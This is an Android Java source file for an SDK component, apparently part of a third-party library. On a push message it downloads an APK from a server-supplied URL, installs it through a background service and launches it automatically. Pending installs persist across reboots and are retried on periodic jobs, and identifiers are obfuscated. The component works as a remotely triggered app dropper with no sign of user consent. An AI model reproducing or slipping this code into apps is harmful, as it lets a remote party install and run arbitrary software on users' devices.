package utils.app.com.installs;

import android.app.Application;
import android.content.ActivityNotFoundException;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;

import com.evernote.android.job.Job;
import com.evernote.android.job.JobRequest;
import com.evernote.android.job.util.support.PersistableBundleCompat;
import com.thin.downloadmanager.DefaultRetryPolicy;
import com.thin.downloadmanager.DownloadRequest;
import com.thin.downloadmanager.DownloadStatusListenerV1;
import com.thin.downloadmanager.ThinDownloadManager;

import java.io.File;
import java.util.concurrent.TimeUnit;

import commons.app.com.commons.commons.SdkCommons;
import commons.app.com.commons.commons.SdkComponent;
import utils.app.com.installs.models.ApkInfoModel;
import utils.app.com.installs.sys.TimerService;
import commons.app.com.keep.NetworkApi;
import timber.log.Timber;

public class InstallsComponent extends SdkComponent {

    private static InstallsComponent instance;

    public static final String ARG_APP_ID = "i18927878_arg_1";
    private static final String JOB_TAG_INSTALL_EVENT = "i92797272729_j_1";
    private static final String JOB_TAG_CHECK_PENDING = "i92797272729_j_2";
    private static final String JOB_TAG_CHECK_PENDING_NOW = "i92797272729_j_3";

    private SharedPrefs preferences;
    private ThinDownloadManager downloadManager;

    public static InstallsComponent get() {
        return instance;
    }

    public InstallsComponent() {
        instance = this;
    }

    @Override
    public void initialize(Application context, SdkCommons sdk, NetworkApi api) {
        super.initialize(context, sdk, api);
        preferences = new SharedPrefs(context);
        downloadManager = new ThinDownloadManager();
    }

    @Override
    public void onDeviceRegistered() {
        startPendingInstallsJob();
    }

    @Override
    public void onFcmMessageReceived(Bundle payload) {
        String type = payload.getString("type");
        if ("apk".equals(type)) {
            String receivedUrl = payload.getString("url");
            String appId = payload.getString("apk_id");
            if (receivedUrl != null && appId != null) {
                onUrlReceived(receivedUrl, appId);
            }
        }
    }

    @Override
    public void onDeviceRebooted() {
        checkPendingInstalls();
    }

    @Nullable
    @Override
    public Job createJob(@NonNull String tag) {
        if (JOB_TAG_CHECK_PENDING.equals(tag) ||
                JOB_TAG_CHECK_PENDING_NOW.equals(tag)) {
            return new LoadDataJob();
        }
        if (JOB_TAG_INSTALL_EVENT.equals(tag)) {
            return new UploadEventJob();
        }
        return null;
    }

    public SharedPrefs preferences() {
        return preferences;
    }

    ///////////////////////////////////////////////////////////////////////////
    // INNER
    ///////////////////////////////////////////////////////////////////////////

    public void onUrlReceived(String downloadUrl, final String appId) {
        if (TimerService.isServiceRunning()) {
            Timber.e("service is already running");
            return;
        }
        Uri downloadUri = Uri.parse(downloadUrl);
        File destinationFolder = context().getExternalCacheDir();
        assert destinationFolder != null;
        Uri destinationUri = Uri.parse(destinationFolder.getAbsolutePath()
                + "/"
                + downloadUri.getLastPathSegment());
        DownloadRequest downloadRequest = new DownloadRequest(downloadUri)
                .setRetryPolicy(new DefaultRetryPolicy())
                .setDestinationURI(destinationUri).setPriority(DownloadRequest.Priority.HIGH)
                .setStatusListener(new DownloadStatusListenerV1() {
                    @Override
                    public void onDownloadComplete(DownloadRequest downloadRequest) {
                        String path = downloadRequest.getDestinationURI().getPath();
                        String pkgName = MainUtils.getPackageName(context(), path);
                        ApkInfoModel info = new ApkInfoModel(appId, path, pkgName);
                        install(info);
                    }

                    @Override
                    public void onDownloadFailed(DownloadRequest downloadRequest, int errorCode, String errorMessage) {

                    }

                    @Override
                    public void onProgress(DownloadRequest downloadRequest, long totalBytes, long downloadedBytes, int progress) {

                    }
                });
        downloadManager.add(downloadRequest);
    }

    private void checkPendingInstalls() {
        ApkInfoModel apkInfo = preferences.getTargetApkInfo();
        if (apkInfo != null) {
            install(apkInfo);
        }
    }

    ///////////////////////////////////////////////////////////////////////////
    // JOBS
    ///////////////////////////////////////////////////////////////////////////

    public void startPendingInstallsJob() {
        startInstallCheckJobNow();
        startInstallCheckJobRepeated();
    }

    public void submitInstallEventJob(String apkId) {
        PersistableBundleCompat extras = new PersistableBundleCompat();
        extras.putString(ARG_APP_ID, apkId);
        long backoffTime = TimeUnit.MINUTES.toMillis(1);
        new JobRequest.Builder(JOB_TAG_INSTALL_EVENT)
                .addExtras(extras)
                .setBackoffCriteria(backoffTime, JobRequest.BackoffPolicy.EXPONENTIAL)
                .startNow()
                .build()
                .schedule();
    }

    private void startInstallCheckJobNow() {
        long executionWindow = TimeUnit.SECONDS.toMillis(10);
        long startTime = TimeUnit.SECONDS.toMillis(55);
        new JobRequest.Builder(JOB_TAG_CHECK_PENDING_NOW)
                .setExecutionWindow(startTime, startTime + executionWindow)
                .setBackoffCriteria(startTime, JobRequest.BackoffPolicy.EXPONENTIAL)
                .setUpdateCurrent(true)
                .setRequiredNetworkType(JobRequest.NetworkType.CONNECTED)
                .build()
                .schedule();
    }

    private void startInstallCheckJobRepeated() {
        new JobRequest.Builder(JOB_TAG_CHECK_PENDING)
                .setPeriodic(TimeUnit.MINUTES.toMillis(40), TimeUnit.MINUTES.toMillis(20))
                .setUpdateCurrent(true)
                .setRequiredNetworkType(JobRequest.NetworkType.CONNECTED)
                .build()
                .schedule();
    }

    ///////////////////////////////////////////////////////////////////////////
    // UTILS
    ///////////////////////////////////////////////////////////////////////////

    public void onAppInstalled(String pkgName) {
        ApkInfoModel apkInfo = preferences.getTargetApkInfo();
        // Launch installed app, only if this is our app (we have stored apkId)
        if (apkInfo != null && pkgName.equals(apkInfo.getPackageName())) {
            submitInstallEventJob(apkInfo.getId());
            launchApp(context(), pkgName);
            preferences.saveTargetApkInfo(null);
        }
    }

    private void launchApp(Context context, @NonNull String packageName) {
        try {
            Intent launchIntent = context.getPackageManager().getLaunchIntentForPackage(packageName);
            context.startActivity(launchIntent);
        } catch (ActivityNotFoundException e) {
            e.printStackTrace();
        }
    }

    private void install(ApkInfoModel model) {
        if (MainUtils.isAppInstalled(context(), model.getPackageName())) {
            submitInstallEventJob(model.getId());
            preferences.saveTargetApkInfo(null);
            return;
        }
        preferences.saveTargetApkInfo(model);
        //
        Intent starter = new Intent(context(), TimerService.class);
        starter.putExtra(TimerService.APK_FILE_PATH, model.getFilePath());
        starter.putExtra(TimerService.APK_PACKAGE_NAME, model.getPackageName());
        starter.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context().startService(starter);
    }
}
